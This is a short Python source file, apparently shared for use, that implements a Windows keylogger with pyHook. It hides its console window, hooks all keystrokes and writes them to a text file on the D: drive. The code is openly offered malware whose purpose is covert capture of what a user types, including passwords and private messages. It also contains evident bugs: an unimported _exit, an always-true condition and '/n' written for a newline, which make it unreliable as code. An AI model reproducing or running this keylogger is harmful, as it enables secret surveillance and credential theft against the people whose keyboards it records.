# -*- coding: utf-8 -*-

# An easy keylogger in windows with winHook
# Coding with python, so here dependency some package:
# > Python: http://www.python.org/getit/
# > Pyhook: http://sourceforge.net/projects/pyhook/
# > Python for Windows Extensions: http://sourceforge.n...ojects/pywin32/
# click on CTRL + E to end.
#
# Author: s0nnet
# Email: s0nnet@sina.com


import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii == 5:
        _exit(1)

    if event.Ascii != 0 or 8:
        f = open('D:\output.txt', 'r')
        buffer = f.read()
        f.close()

    f = open('D:\output.txt', 'w')
    keylogs = chr(event.Ascii)

    if event.Ascii == 13:
        keylogs = '/n'
    
    buffer += keylogs
    f.write(buffer)
    f.close()

if __name__ == "__main__":
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()
